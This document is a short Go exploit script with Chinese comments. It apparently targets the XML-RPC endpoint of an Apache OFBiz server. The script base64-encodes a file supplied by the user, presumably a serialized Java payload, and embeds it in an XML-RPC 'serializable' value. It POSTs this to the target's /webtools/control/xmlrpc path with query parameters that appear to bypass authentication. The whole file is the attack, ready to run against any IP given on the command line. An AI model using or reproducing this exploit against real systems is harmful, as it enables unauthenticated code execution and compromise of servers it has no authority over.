package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	// 检查命令行参数数量
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run script.go <target_ip> <file_path>")
		os.Exit(1)
	}

	// 获取命令行参数
	targetIP := os.Args[1]
	filePath := os.Args[2]

	// 读取文件内容并进行 base64 编码
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		os.Exit(1)
	}
	base64Data := base64.StdEncoding.EncodeToString(fileContent)

	// 构建 XML-RPC 请求的 XML 内容
	xmlContent := fmt.Sprintf(`
<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">%s</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>`, base64Data)

	// 构建请求 URL
	url := fmt.Sprintf("http://%s:8443/webtools/control/xmlrpc?USERNAME&PASSWORD=mdtest&requirePasswordChange=Y", targetIP)

	// 发送 HTTP POST 请求
	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(xmlContent))
	if err != nil {
		fmt.Println("Error sending HTTP request:", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	// 读取响应内容
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		os.Exit(1)
	}

	// 打印响应内容
	fmt.Println("Response:")
	fmt.Println(string(respBody))
}

